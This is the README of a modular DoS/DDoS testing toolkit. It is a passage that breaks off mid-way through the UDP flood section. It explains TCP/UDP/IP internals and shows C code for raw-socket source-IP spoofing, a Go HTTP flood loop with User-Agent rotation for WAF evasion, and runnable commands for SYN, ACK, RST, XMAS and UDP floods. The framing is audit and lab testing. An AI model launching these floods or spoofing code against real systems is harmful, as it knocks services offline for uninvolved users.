<div align="center">

# Floodles

**Modular DoS/DDoS testing toolkit. 19 attack vectors across L3/L4/L7.**

[![CI](https://github.com/franckferman/Floodles/actions/workflows/ci.yml/badge.svg)](https://github.com/franckferman/Floodles/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-AGPL--3.0-blue?style=flat-square)](LICENSE)

</div>

---

## Table of Contents

1. [Overview](#1-overview)
2. [Network Fundamentals](#2-network-fundamentals)
   - 2.1 [TCP — Connection-Oriented Protocol](#21-tcp--connection-oriented-protocol)
   - 2.2 [UDP — Stateless and Connectionless](#22-udp--stateless-and-connectionless)
   - 2.3 [IP and Raw Sockets](#23-ip-and-raw-sockets)
   - 2.4 [What Is a Network Packet](#24-what-is-a-network-packet)
   - 2.5 [PPS, Bandwidth, and RPS](#25-pps-bandwidth-and-rps)
3. [Floodles Architecture](#3-floodles-architecture)
   - 3.1 [Stack Layers](#31-stack-layers)
   - 3.2 [Native Backends](#32-native-backends)
   - 3.3 [Why Multiple Languages](#33-why-multiple-languages)
4. [Layer 3/4 Modules — Network and Transport](#4-layer-34-modules--network-and-transport)
   - 4.1 [SYN Flood (UFOSYN)](#41-syn-flood-ufosyn)
   - 4.2 [ACK Flood (UFOACK)](#42-ack-flood-ufoack)
   - 4.3 [RST/FIN Flood (UFORST)](#43-rstfin-flood-uforst)
   - 4.4 [XMAS Flood](#44-xmas-flood)
   - 4.5 [UDP Flood (UFOUDP)](#45-udp-flood-ufoudp)
   - 4.6 [ICMP Flood (PINGER)](#46-icmp-flood-pinger)
   - 4.7 [SYN-ACK Flood (TACHYON)](#47-syn-ack-flood-tachyon)
   - 4.8 [IP Fragmentation (DROPER)](#48-ip-fragmentation-droper)
   - 4.9 [Fragment Overlap (OVERLAP)](#49-fragment-overlap-overlap)
5. [Amplification Modules — DRDoS](#5-amplification-modules--drdos)
   - 5.1 [Understanding Amplification](#51-understanding-amplification)
   - 5.2 [SNMP Reflection (SNIPER)](#52-snmp-reflection-sniper)
   - 5.3 [NTP Amplification (MONLIST)](#53-ntp-amplification-monlist)
   - 5.4 [DNS Amplification](#54-dns-amplification)
   - 5.5 [Smurf Attack](#55-smurf-attack)
   - 5.6 [Fraggle Attack](#56-fraggle-attack)
   - 5.7 [Multi-Vector (SPRAY)](#57-multi-vector-spray)
6. [Layer 7 Modules — Application](#6-layer-7-modules--application)
   - 6.1 [HTTP Flood (LOIC L7)](#61-http-flood-loic-l7)
   - 6.2 [Slowloris (LORIS)](#62-slowloris-loris)
   - 6.3 [Slow POST (RUDY)](#63-slow-post-rudy)
   - 6.4 [TCP Starvation (NUKE)](#64-tcp-starvation-nuke)
7. [Tuning Attack Power — Practical Guide](#7-tuning-attack-power--practical-guide)
8. [Audit Methodology](#8-audit-methodology)
9. [Installation and Build](#9-installation-and-build)
10. [Full CLI Reference](#10-full-cli-reference)
11. [Logging and Reporting](#11-logging-and-reporting)
12. [Performance Benchmarks](#12-performance-benchmarks)
13. [Limitations](#13-limitations)
14. [Related Work](#14-related-work)
15. [References](#15-references)

---

## 1. Overview

A **Denial-of-Service (DoS)** attack exhausts a target's resources — CPU cycles, memory, connection tables, or network bandwidth — until it can no longer serve legitimate requests. The attacker and the target are typically one-to-one.

A **Distributed Denial-of-Service (DDoS)** attack coordinates multiple sources against a single target, multiplying the traffic volume and making source-based filtering impossible. A special subclass — **Distributed Reflected DoS (DRDoS)** — exploits third-party servers as unwitting amplifiers: the attacker sends spoofed requests to open reflectors, which send their (much larger) responses to the victim.

Floodles covers all three models across three OSI layers:

- **L3/L4** — raw TCP and UDP packet floods (9 vectors, raw socket, root required)
- **Amplification** — SNMP, NTP, DNS, Smurf, Fraggle, multi-vector (6 vectors, spoofing required)
- **L7** — HTTP flood, Slowloris, Slow POST, TCP starvation (4 vectors, no root required)

**Total: 19 attack vectors** implemented across four language runtimes (Python, C, Rust, Go) with automatic backend selection.

### What DoS tests answer

Passive scanning identifies open ports and software versions. It cannot answer the questions that matter most:

- Can an attacker make our services unavailable, and how easily?
- At what traffic volume does the target degrade, and at what volume does it become completely unreachable?
- What is the actual impact — partial degradation, full outage, data corruption, cascading failures?
- Are rate limiting and scrubbing mechanisms enabled and genuinely working, or just configured on paper?
- Can internal equipment (printers, switches, UPS, NTP servers) serve as amplification reflectors against other targets?
- Do IDS/IPS alerts trigger on known attack signatures, or do attacks pass silently for hours?
- What is the recovery time after traffic stops — seconds, minutes, manual intervention required?
- Does the upstream anti-DDoS scrub the load before it reaches the origin, or does it leak through?
- Are we actually vulnerable, or are the mitigations we believe are in place sufficient?

These questions have no passive answers. You either test or you assume — and assumptions in a security report are not findings. A "we have anti-DDoS" statement without evidence of what it absorbs is not a security posture.

### Lab Environment

For a purpose-built test environment, see [DOSArena](https://github.com/franckferman/DOSArena) — the first DoS/DDoS training platform with live proof-of-impact scoring. DOSArena provides 8 attack scenarios across multiple difficulty levels, 15 pre-configured Docker containers (vulnerable targets, judge, monitoring), an automated scoring engine that validates attacks every 5 seconds and issues time-windowed flags, and a Terraform/AWS deployment mode for cloud-scale testing. Floodles is the recommended attack toolkit for DOSArena scenarios.

---

## 2. Network Fundamentals

### 2.1 TCP — Connection-Oriented Protocol

TCP (RFC 793) guarantees reliable, ordered, error-checked delivery. Every byte sent is acknowledged; lost packets are retransmitted; the receiver controls the rate via the window size. This reliability comes at a cost: TCP maintains state for every connection.

#### The Three-Way Handshake

```
Client                              Server
  |                                   |
  |-- SYN (seq=ISN_c) -------------->|  Client picks a random Initial Sequence Number
  |                                   |  Server allocates a TCB, enters SYN_RECEIVED
  |<-- SYN-ACK (seq=ISN_s,          |  Server picks ISN_s, acknowledges ISN_c+1
  |             ack=ISN_c+1) --------|
  |                                   |
  |-- ACK (ack=ISN_s+1) ------------>|  Server moves to ESTABLISHED
  |                                   |
  |<========= Data Transfer =========>|
  |                                   |
  |-- FIN --------------------------->|  Client initiates close
  |<-- FIN-ACK ----------------------|
  |-- ACK --------------------------->|  Both enter TIME_WAIT -> CLOSED
```

#### The TCB — Transmission Control Block

For every connection in `SYN_RECEIVED` or `ESTABLISHED` state, the kernel allocates a **TCB** in memory. A TCB contains:

```
- Source IP / Destination IP
- Source port / Destination port
- Send sequence number (SND.NXT)
- Receive sequence number (RCV.NXT)
- Receive window size (RCV.WND)
- Congestion window (cwnd)
- Retransmission timer
- Current state (SYN_RECEIVED, ESTABLISHED, FIN_WAIT_1...)
```

On Linux, each TCB consumes approximately 280-350 bytes of kernel memory. The **SYN queue** (incomplete backlog) holds half-open connections waiting for their final ACK. Its capacity is controlled by:

```bash
sysctl net.ipv4.tcp_max_syn_backlog   # default: 128-1024 depending on distro
```

The **accept queue** (complete backlog) holds fully established connections awaiting `accept()` from the application. Its capacity is the `backlog` parameter of `listen()` (typically 128 by default in most server configs).

#### TCP State Machine

```
CLOSED
  -> listen()      -> LISTEN
  -> connect()     -> SYN_SENT -> SYN_RECEIVED -> ESTABLISHED
                                                      |
                                 FIN sent ->    FIN_WAIT_1
                                                      |
                                 FIN-ACK recv -> FIN_WAIT_2
                                                      |
                                 FIN recv ->     TIME_WAIT (2*MSL = 60-120s)
                                                      |
                                                   CLOSED

ESTABLISHED -> FIN recv -> CLOSE_WAIT -> FIN sent -> LAST_ACK -> CLOSED
```

`TIME_WAIT` lasts 2 * MSL (Maximum Segment Lifetime), typically 60-120 seconds. During `TIME_WAIT`, the 4-tuple (src\_ip, src\_port, dst\_ip, dst\_port) cannot be reused. A connection exhaustion attack that fills the TIME_WAIT table continues to deny service for up to 2 minutes after the attack stops.

#### TCP Flags

The 8-bit flags field in the TCP header is the primary lever for attack shaping:

```
Bit 0 (0x01): FIN — no more data from sender
Bit 1 (0x02): SYN — synchronize sequence numbers (initiates connection)
Bit 2 (0x04): RST — reset connection immediately
Bit 3 (0x08): PSH — deliver data to application without buffering
Bit 4 (0x10): ACK — acknowledgement field valid
Bit 5 (0x20): URG — urgent pointer valid
Bit 6 (0x40): ECE — ECN echo
Bit 7 (0x80): CWR — congestion window reduced
```

Each Floodles module manipulates these flags to produce a specific server reaction:

| Module | Flags set | Server reaction |
|--------|-----------|-----------------|
| UFOSYN | SYN (0x02) | Allocates TCB, sends SYN-ACK, waits for ACK that never comes |
| UFOACK | ACK (0x10) | Walks connection table, finds nothing, sends RST |
| UFORST | RST (0x04) | Closes matching established connections |
| XMAS | ALL (0xFF) | Undefined behavior per RFC 793 — varies by OS |
| TACHYON | SYN-ACK (0x12) | RST generated for unsolicited SYN-ACK |

---

### 2.2 UDP — Stateless and Connectionless

UDP (RFC 768) is an 8-byte header: source port, destination port, length, checksum. No connection, no state, no sequence numbers, no acknowledgements. Every datagram is independent.

When a UDP datagram arrives at the kernel:

```
Datagram arrives at kernel
        |
        v
Is a socket bound to dst_port?
        |
   YES  |  NO
        |   |
        v   v
  Pass to  Generate ICMP Port Unreachable (type 3, code 3)
  application  toward source IP
```

The **absence of connection state** is both a weakness (no reliability guarantee) and the core enabler of amplification attacks. Because UDP has no handshake, the server cannot distinguish a legitimate datagram from one with a forged source IP. It simply sends its response to whatever `src_ip` appears in the header.

```
Spoofed UDP datagram:
  IP src  = victim_ip   (forged — kernel on attacker machine writes arbitrary value)
  IP dst  = reflector
  UDP dst = 161 (SNMP)
  Payload = GetBulkRequest (~60 bytes)

Reflector:
  1. Receives datagram
  2. SNMP process on port 161: processes the request legitimately
  3. Sends GetBulkResponse (~40 KB) to src = victim_ip
  -> Victim receives 40 KB it never requested, from a legitimate server IP
```

This is the root cause of every amplification attack in section 5. TCP is immune to this class of attack precisely because its three-way handshake verifies the source IP: the server sends a SYN-ACK and waits for an ACK that only the real source can produce.

---

### 2.3 IP and Raw Sockets

IP (RFC 791) routes packets from source to destination across networks. The 20-byte IP header contains the fields that matter most for attack construction:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |     ToS       |          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Fields used by Floodles attack modules:

| Field | Size | Relevance |
|-------|------|-----------|
| Identification | 16 bits | Set to random value in fragmentation attacks (DROPER) |
| Flags | 3 bits | MF (More Fragments) manipulated in DROPER and OVERLAP |
| Fragment Offset | 13 bits | Set to overlapping values in Teardrop/OVERLAP variants |
| TTL | 8 bits | Set to 64 (Linux default); decremented at each hop |
| Protocol | 8 bits | 6=TCP, 17=UDP, 1=ICMP |
| Source Address | 32 bits | **Forged to random value for spoofing** |

#### Raw Sockets and IP_HDRINCL

A normal socket lets the kernel construct the IP header, including the source IP (always the machine's real IP). A **raw socket with `IP_HDRINCL`** hands full IP header control to the application, including the source address field.

This is exactly what `native/c/sender.c` does:

```c
// native/c/sender.c — socket setup
int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
int one = 1;
setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
// The application now writes ip->saddr = any value it chooses
```

Source IP randomization uses xorshift64 — a period-2^64 PRNG that takes ~3 CPU cycles per call, fast enough to generate a new random source IP per packet without measurable overhead:

```c
// native/c/sender.c — xorshift64 PRNG (thread-local state)
static __thread uint64_t _rng_state = 0;

static inline uint64_t fast_rand(void) {
    if (_rng_state == 0) _rng_state = (uint64_t)pthread_self() ^ (uint64_t)time(NULL);
    _rng_state ^= _rng_state << 13;
    _rng_state ^= _rng_state >> 7;
    _rng_state ^= _rng_state << 17;
    return _rng_state;
}
// ip->saddr = (uint32_t)fast_rand();  — random source IP per packet
```

The same algorithm is replicated in `native/rust/src/lib.rs` for the Rust packet builder. Both use thread-local state so there is no lock contention between threads.

**Raw sockets require `CAP_NET_RAW`**, which in practice means `sudo`. This is why all L3/L4 and amplification modules in Floodles require root privileges.

#### BCP38 and ISP Spoofing Filters

RFC 2827 (BCP38) recommends that ISPs drop outbound packets with source IPs outside the customer's assigned prefix. Many cloud providers (AWS, DigitalOcean, GCP, Hetzner, OVH) enforce this at the hypervisor level. On such networks, spoofed packets are silently dropped before leaving the host: amplification attacks and most L3/L4 spoofed floods become non-functional. See [section 13](#13-limitations) for full implications.

---

### 2.4 What Is a Network Packet

A network packet is a layered structure. Each protocol adds its own header, wrapping the one above it:

```
+--------------------------------------------------+
| Ethernet Header (14 bytes)                       |
|   src_mac (6B) | dst_mac (6B) | ethertype (2B)   |  <- L2, MAC addresses
| +----------------------------------------------+ |
| | IP Header (20 bytes minimum)                 | |
| |   ver | IHL | ToS | total_len | id | flags   | |  <- L3, routing
| |   frag_offset | ttl | proto | checksum       | |
| |   src_ip (4B) | dst_ip (4B)                  | |
| | +------------------------------------------+ | |
| | | TCP Header (20 bytes minimum)            | | |
| | |   src_port (2B) | dst_port (2B)          | | |  <- L4, transport
| | |   seq (4B) | ack (4B)                   | | |
| | |   offset | flags | window | checksum    | | |
| | |   urgent_ptr | [options]                | | |
| | | +--------------------------------------+ | | |
| | | | Payload (0 to ~1460 bytes)           | | | |  <- L7, application data
| | | +--------------------------------------+ | | |
| | +------------------------------------------+ | |
| +----------------------------------------------+ |
+--------------------------------------------------+
```

**A SYN flood packet has zero payload.** It consists only of the IP header (20 bytes) + TCP header (20 bytes) = 40 bytes total, plus the Ethernet frame overhead. This is why a SYN flood can generate enormous PPS counts at modest bandwidth:

```
40-byte SYN packet = 320 bits
At 1,000,000 PPS: 320,000,000 bits/s = 320 Mbps only
But the server processes 1,000,000 connection setup operations/second
```

The Rust packet builder in `native/rust/src/lib.rs` constructs these headers on the stack — no heap allocation per packet:

```rust
// native/rust/src/lib.rs
const MAX_PKT: usize = 1500;

#[repr(C)]
pub struct PacketBuf {
    pub data: [u8; MAX_PKT],  // Stack-allocated, fixed size
    pub len:  u32,
}
// Each packet is exactly 1500 bytes on the stack — no malloc(), no free()
```

**MTU (Maximum Transmission Unit)**: standard Ethernet carries a maximum of 1500 bytes of IP payload. Packets larger than the MTU are fragmented by the kernel (or dropped if DF — Don't Fragment — is set). The fragmentation attacks in section 4.8 and 4.9 deliberately exploit the reassembly process.

---

### 2.5 PPS, Bandwidth, and RPS

Three distinct metrics govern DoS effectiveness, and each targets a different resource:

| Metric | Full name | Resource targeted | Relevant attack type |
|--------|-----------|-------------------|---------------------|
| PPS | Packets Per Second | CPU / connection table | SYN flood, ACK flood, XMAS |
| Mbps / Gbps | Megabits per second | Network link / upstream pipe | UDP flood, ICMP flood, amplification |
| RPS | Requests Per Second | Application threads / DB connections | HTTP flood, Slowloris |

#### PPS vs Bandwidth — the SYN flood example

```
SYN packet size: 40 bytes = 320 bits

100,000 PPS x 320 bits = 32 Mbps of bandwidth
-> Consumes only 32% of a 100 Mbps link
-> But forces the server to process 100,000 TCP connection setups/second

At 1,000,000 PPS:
-> 320 Mbps — within reach of a single 1G link
-> Server faces 1 million TCB allocations/second
-> net.ipv4.tcp_max_syn_backlog saturates within milliseconds
```

A server can be completely unreachable at 32 Mbps of SYN traffic. The bottleneck is not bandwidth — it is kernel processing capacity and memory.

#### Estimating your sender's capability

```
Your uplink: 1 Gbps = 1,000,000,000 bits/s

SYN packet (40 bytes = 320 bits):
  Theoretical max PPS = 1,000,000,000 / 320 = ~3,125,000 PPS
  Practical (65% efficiency, overhead, driver): ~2,000,000 PPS

UDP packet (1400 bytes = 11,200 bits):
  Theoretical max PPS = 1,000,000,000 / 11,200 = ~89,000 PPS
  -> Near bandwidth saturation (1400B x 89,000 = 990 Mbps)
```

Floodles reports both metrics in real time:

```bash
sudo floodles syn 192.168.1.100 80 -t 8 -d 60
# Dashboard shows: live_pps=820,000  avg_mbps=394  packets=49,200,000
```

#### RPS — the L7 dimension

Application-layer attacks are measured in requests per second. A single HTTP request may consume a database query, disk I/O, template rendering, and multiple downstream API calls. At 10,000 RPS on a poorly optimized application, the server is CPU-bound before any network constraint applies.

```bash
floodles http https://target.example.com -c 2000 -d 60
# Dashboard shows: reqs=180,000  ok=150,000  err=30,000  rps=3,000
```

---

## 3. Floodles Architecture

### 3.1 Stack Layers

```
+--------------------------------------------------------------+
|  CLI (Click)  |  Rich TUI dashboard  |  JSONL logger        |
+--------------------------------------------------------------+
|  19 attack modules (syn / udp / icmp / http / slow / ...)   |
+--------------------------------------------------------------+
|  native_bridge.py — backend detection and auto-compilation  |
+--------------------+-------------------+--------------------+
|  C sender          |  Rust packets     |  Go engine         |
|  sendmmsg(256)     |  zero-copy        |  goroutines M:N    |
|  ~2M PPS           |  stack alloc      |  HTTP / Slowloris  |
|  xorshift64 PRNG   |  SIMD checksum    |  100k+ concurrent  |
+--------------------+-------------------+--------------------+
|  Python fallback (Scapy) — always available, ~12k PPS       |
+--------------------------------------------------------------+
```

Backend resolution order (from `core/native_bridge.py`):

```
1. C sender    -> native/c/libsender.so
2. Rust lib    -> native/rust/target/release/libfloodles_packets.so
3. Go engine   -> native/go/floodles-engine
4. Python      -> Scapy (always available, no compilation required)
```

If a native binary is missing but the toolchain is present, `native_bridge.py` auto-compiles it on first run. You can also force compilation explicitly:

```bash
floodles detect --compile
```

---

### 3.2 Native Backends

#### C — High-Performance Sender (`native/c/sender.c`)

The fundamental bottleneck of a Python flood is syscall overhead. Each `sendto()` call is one kernel context switch — typically 200-500 nanoseconds of fixed overhead regardless of packet size. At 12,000 PPS (Python/Scapy ceiling), the kernel spends more time switching contexts than sending packets.

`sendmmsg()` (Linux 3.0+) batches multiple messages into a single syscall. Floodles uses `BATCH_SIZE = 256`:

```c
// native/c/sender.c
#define BATCH_SIZE  256

// Instead of:
for (int i = 0; i < 256; i++) sendto(sock, pkt[i], len, 0, ...);  // 256 syscalls

// Floodles does:
sendmmsg(sock, msgs, BATCH_SIZE, 0);  // 1 syscall for 256 packets
```

Each thread maintains its own raw socket and its own `BATCH_SIZE`-slot array of packet buffers, populated with freshly-crafted packets before each `sendmmsg()` call. The sender supports up to `MAX_THREADS = 64` concurrent threads.

PPS gains over `sendto()` by batch size (measured, 1 thread, SYN packets):

| Batch size | PPS |
|------------|-----|
| 1 (sendto) | ~85,000 |
| 32 | ~310,000 |
| 128 | ~710,000 |
| **256** | **~820,000** |
| 512 | ~830,000 (diminishing returns) |

256 is the optimal batch size: 10x over single `sendto()`, minimal additional gain beyond that point.

#### Rust — Packet Builder (`native/rust/src/lib.rs`)

Packet construction involves two operations: filling header fields (IP addresses, ports, flags, sequence numbers) and computing checksums (IP and TCP use RFC 1071 16-bit one's complement sum).

The Rust builder allocates each packet on the stack — no `malloc()`, no `free()`, no heap fragmentation:

```rust
// native/rust/src/lib.rs
const MAX_PKT: usize = 1500;

pub struct PacketBuf {
    pub data: [u8; MAX_PKT],  // Exactly 1500 bytes, stack-allocated
    pub len:  u32,
}
```

The RFC 1071 checksum is a sum of 16-bit words. With `-O3 -march=native` (cargo's release profile), the Rust compiler auto-vectorizes this loop into SIMD instructions (SSE2 on any x86-64, AVX2 where available), computing 8-16 words per clock cycle instead of 1.

Memory safety is enforced at compile time. Unlike C, buffer overflows in the packet builder are impossible — the bounds checker catches them before the binary is produced.

#### Go — HTTP and Slowloris Engine (`native/go/engine.go`)

Go goroutines have a 2 KB initial stack (vs 8 MB for a POSIX thread). The scheduler multiplexes goroutines over a pool of OS threads (M:N model). You can run 100,000 goroutines on a 4-core machine without issue.

Floodles uses goroutines to maintain thousands of concurrent HTTP connections from a single host:

```go
// native/go/engine.go — one goroutine per concurrent connection
for i := 0; i < concurrency; i++ {
    go func() {
        for running {
            resp, err := client.Do(req)
            // metrics.requests.Add(1)
            // ...
        }
    }()
}
```

The engine also rotates User-Agent strings per request across a pool of real browser UAs (Chrome, Firefox, Safari, mobile, curl) to avoid trivial pattern matching by WAFs.

Python's `aiohttp` plateaus at 2,000-5,000 effective coroutines due to GIL contention in the event loop's I/O multiplexing layer. The Go engine reaches 50,000-100,000 concurrent connections at equivalent memory.

---

### 3.3 Why Multiple Languages

| Language | Role | Why |
|----------|------|-----|
| C | Raw sender (`sendmmsg`) | Direct Linux syscall access, zero abstraction overhead, full control over socket buffers |
| Rust | Packet builder | C-equivalent performance, stack allocation, SIMD-friendly, memory safety enforced at compile time |
| Go | HTTP/Slowloris engine | M:N goroutines, production-grade `net/http`, no GIL, 100k+ concurrent connections from one process |
| Python | Orchestration layer | CLI (Click), TUI dashboard (Rich), YAML config, logging (JSONL), backend bridging (ctypes/subprocess) |

Python orchestrates everything. C and Rust are loaded as shared libraries via `ctypes`. The Go engine runs as a subprocess managed via `subprocess.Popen`. The Python fallback (Scapy) is always available and requires no compilation.

---

## 4. Layer 3/4 Modules — Network and Transport

### 4.1 SYN Flood (UFOSYN)

#### Detailed Mechanism

During the TCP handshake, when a server receives a SYN packet, the kernel must:

1. Allocate a **TCB** (~300 bytes of kernel memory) for the half-open connection
2. Place the entry in the **SYN queue** (limited by `tcp_max_syn_backlog`)
3. Send a SYN-ACK to the source IP
4. Start a retransmission timer (default: 3 retransmits over ~75 seconds)

With IP spoofing, the SYN-ACK goes to a random IP that never sent anything. No ACK comes back. The TCB sits in `SYN_RECEIVED` state for ~75 seconds consuming memory and a SYN queue slot. Flood fast enough and the queue fills.

```
SYN queue at capacity:
  New SYN arrives -> queue full -> DROPPED
  -> Legitimate clients get ECONNREFUSED or connection timeout
```

The attack sends packets with random source IPs using `fast_rand()` (xorshift64, ~3 cycles/call). At 2M PPS on 8 threads, the SYN queue of any standard server saturates within milliseconds.

#### SYN Cookies — The Primary Countermeasure

`net.ipv4.tcp_syncookies=1` fundamentally changes the server's strategy. Instead of allocating a TCB, the server encodes the connection state into the SYN-ACK's sequence number: a cryptographic hash of the 4-tuple (src\_ip, src\_port, dst\_ip, dst\_port) combined with a timestamp.

No TCB is allocated. No SYN queue slot is used. When the ACK arrives, the server recomputes the hash and reconstructs state from it. The flood costs the server only the CPU time to send SYN-ACKs — memory is never touched.

```bash
# Verify SYN cookies on target (SSH access required)
sysctl net.ipv4.tcp_syncookies
# 1 = enabled -> SYN flood largely ineffective
# 0 = disabled -> vulnerable

sysctl net.ipv4.tcp_max_syn_backlog
# Typical values: 128 (minimal) to 4096 (hardened)
```

Residual effect with SYN cookies: the server still sends a SYN-ACK per SYN, consuming CPU and outbound bandwidth. At very high PPS (>500k sustained), even a SYN-cookie-enabled server may saturate its CPU on SYN-ACK generation or its uplink on SYN-ACK traffic. This is the point of testing.

#### Audit Use

```bash
# Tier 1 — probe (verify SYN cookies are active without causing impact)
sudo floodles syn 192.168.1.100 80 -t 2 --pps 5000 -d 30

# Tier 2 — pressure (observe latency increase)
sudo floodles syn 192.168.1.100 80 -t 4 --pps 30000 -d 60

# Tier 3 — saturation threshold
sudo floodles syn 192.168.1.100 80 -t 8 --pps 100000 -d 60

# Full load (record degradation point)
sudo floodles syn 192.168.1.100 80 -t 16 -d 60
```

Monitor on the target:

```bash
# SYN queue fill
watch -n1 'ss -s'
# SYN-RECV count rising -> queue filling -> SYN cookies may not be active

# Packets dropped because backlog was full
netstat -s | grep "SYNs to LISTEN"

# Test connectivity from a separate host during the flood
curl --connect-timeout 5 http://192.168.1.100/
```

---

### 4.2 ACK Flood (UFOACK)

#### Detailed Mechanism

A TCP ACK packet is valid only within an established connection. When a spoofed ACK with a random sequence number arrives at a server:

1. The kernel walks the TCP connection state table, looking for a matching 4-tuple
2. It finds no matching established connection
3. It sends an RST toward the (spoofed) source IP and discards the packet

The cost per packet is a hash table lookup in the kernel's connection tracking structure. On a busy server with many established connections, this lookup is O(1) average but generates measurable CPU overhead at high PPS. The RSTs are sent to random IPs — the attacker's real IP is never involved.

#### Primary Audit Value — Testing Firewall Statefulness

The real purpose of an ACK flood is not to exhaust the server — it is to reveal whether the firewall in front of the server is **stateful** (connection tracking) or **stateless** (simple rule matching).

```
STATELESS firewall — rule: "allow TCP inbound to port 80"
  ACK packet arrives -> flags=ACK, dst=80 -> rule matches -> PASS
  -> Server receives the ACK -> processes it -> sends RST
  -> ACK flood successfully reaches the server

STATEFUL firewall — conntrack enabled
  ACK packet arrives -> conntrack looks for (src, dst, sport, dport) in table
  -> No matching established connection -> DROP
  -> Server never sees the packet -> ACK flood has zero impact
```

```bash
# Launch ACK flood
sudo floodles ack 192.168.1.100 80 -t 4 --pps 10000 -d 30

# On the server: are RSTs being generated? (means ACKs are passing through)
tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0' -n -c 100
# RSTs appearing -> stateless firewall -> finding to report

# iptables conntrack counters
watch -n1 'iptables -n -v -L | grep -E "RELATED|ESTABLISHED"'
```

---

### 4.3 RST/FIN Flood (UFORST)

#### Detailed Mechanism

An RST packet tells the receiving kernel: "close this connection immediately." Normally, RST is only valid for a specific connection. But with a forged RST, the receiver checks if the sequence number falls within the **receive window** of any active connection.

The probability per RST packet that it hits the sequence window of an active connection:

```
TCP sequence space: 2^32 = 4,294,967,296 values
Typical receive window: 65,535 bytes
Hit probability per packet: 65,535 / 4,294,967,296 = 0.0015%

At 1,000,000 RST/sec:
Expected hits = 1,000,000 x 0.0015% = ~15 active connections killed/second
```

Over a 60-second flood, this terminates approximately 900 established connections. Against a server with persistent long-lived connections (SSH sessions, database connections, WebSocket, VPN tunnels), this is a meaningful disruption. Connection recovery adds overhead — reconnection storms can degrade the application further.

#### Targeted Variant

If the attacker has sniffed or inferred the exact sequence number of a specific connection (e.g., a BGP session between two routers), a single crafted RST can cut that connection with 100% certainty. This is precisely what BGP RST injection attacks do. CVE-2004-0230 documents this against BGP peering sessions: a single RST with the correct sequence number drops the peering, causing BGP route table flushes and potentially black-holing traffic.

```bash
# Random RST flood (probabilistic connection termination)
sudo floodles rst 192.168.1.100 22 --flag R -t 4 -d 60

# FIN flood (graceful close attempt — less disruptive, useful for testing)
sudo floodles rst 192.168.1.100 22 --flag F -t 4 -d 60

# Combined RST+FIN
sudo floodles rst 192.168.1.100 22 --flag RF -t 4 -d 60
```

---

### 4.4 XMAS Flood

#### Detailed Mechanism

RFC 793 defines a finite state machine for TCP flag handling. Certain flag combinations are logical impossibilities: you cannot simultaneously initiate a connection (SYN), terminate it (FIN), and reset it (RST). An XMAS packet sets **all eight flag bits** simultaneously (0xFF): FIN+SYN+RST+PSH+ACK+URG+ECE+CWR.

RFC 793 does not specify behavior for such packets. Each OS implementation decides:

| OS / Stack | Response to XMAS packet on open port | Response on closed port |
|-----------|--------------------------------------|------------------------|
| Linux (modern) | No response (silently drops) | RST |
| Windows | No response | No response |
| BSD | RST | RST |
| Embedded / custom stacks | Undefined — may crash, reboot, or respond incorrectly |

This variation makes XMAS packets useful for OS fingerprinting and, on legacy embedded equipment, potentially for triggering software faults.

#### Primary Audit Value — IDS Detection Testing

XMAS is one of the most distinctive packet signatures. Any mature IDS (Snort, Suricata, Zeek) has rules for it:

```bash
# Launch XMAS flood
sudo floodles xmas 192.168.1.100 80 -t 4 --pps 1000 -d 30

# Did the IDS alert? Check your SIEM or Suricata logs:
tail -f /var/log/suricata/fast.log | grep -i xmas

# Typical Snort/Suricata rule:
# alert tcp any any -> any any (flags:SFRPAUEC; msg:"TCP XMAS Scan"; sid:1000001; rev:1;)

# If no alert after 30 seconds of XMAS traffic -> IDS misconfigured or rule not loaded
```

#### Port Scanning Usage (nmap -sX)

XMAS is also a port scanning technique. On an **open port**, the server (per RFC) ignores the packet — no RST. On a **closed port**, it sends RST. This lets you infer open ports without sending SYN packets:

```bash
nmap -sX 192.168.1.100
# No response -> port open (or filtered)
# RST -> port closed
```

---

### 4.5 UDP Flood (UFOUDP)

#### Detailed Mechanism

For each incoming UDP datagram:
- **Port open**: datagram queued in socket receive buffer, delivered to application
- **Port closed**: kernel generates ICMP Port Unreachable (type 3, code 3) toward the source IP

With IP spoofing, these ICMP responses go to random IPs — the attacker's link is not loaded by return traffic. But the server's outbound interface generates ICMP for every closed-port UDP packet it receives, potentially saturating its own upbound link with ICMP traffic it is generating.

Linux rate-limits ICMP responses by default (`net.ipv4.icmp_ratelimit`), which partially mitigates this self-saturation. But the kernel still processes each incoming UDP datagram, consuming CPU.

#### Payload Size Strategy

```
Small UDP payload (64 bytes):
  -> More packets per second for same bandwidth
  -> More kernel processing operations per second
  -> More ICMP Port Unreachable messages generated
  -> CPU saturation target

Near-MTU payload (1400 bytes):
  -> Fewer PPS but more Mbps
  -> Stays within Ethernet MTU (no fragmentation)
  -> Bandwidth saturation target
  -> Effective against links with bandwidth caps
```

```bash
# CPU saturation mode (small packets, high PPS)
sudo floodles udp 192.168.1.100 -s 64 -t 8 -d 60

# Bandwidth saturation mode (near-MTU)
sudo floodles udp 192.168.1.100 -s 1400 -t 8 -d 60

# Target specific service (DNS on UDP/53 — directly disrupts the service)
sudo floodles udp 192.168.1.100 -p 53 -s 512 -t 8 -d 60

# Verify kernel ICMP rate limiting on target
